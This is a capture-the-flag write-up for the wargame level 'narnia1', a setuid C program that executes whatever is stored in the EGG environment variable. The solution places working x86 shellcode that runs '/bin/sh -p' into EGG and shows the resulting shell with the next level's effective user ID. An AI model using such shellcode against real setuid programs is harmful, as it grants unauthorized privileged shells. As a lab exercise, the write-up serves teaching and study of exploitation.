# narnia1

## Source Code
```c
#include <stdio.h>
int main(){
    int (*ret)();  

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
}        

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

## Solution

The code will execute anything placed in the EGG environment variable. To test this theory, 
place dummy data into the environment variable.

```bash
export EGG=AAAAAAAAAAAAAAAAAAA
```

Run the executable in GBD and you'll find that the A's are being executed by the CPU. This
is because 0x41 translates to the `inc ecx` instruction.

Now let's store some shellcode in the environment variable. I used shellcode to run `/bin/sh -p` ([source](https://github.com/7feilee/shellcode/blob/master/Linux/x86/execve(-bin-bash%2C_%5B-bin-sh%2C_-p%5D%2C_NULL).c)).

```bash
export EGG=$(echo -e "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")
```

Run the executable to get a privileged shell!

```bash
./narnia1
Trying to execute EGG!
bash-5.1$ id
uid=14001(narnia1) gid=14001(narnia1) euid=14002(narnia2) groups=14001(narnia1)
bash-5.1$ whoami
narnia2
```
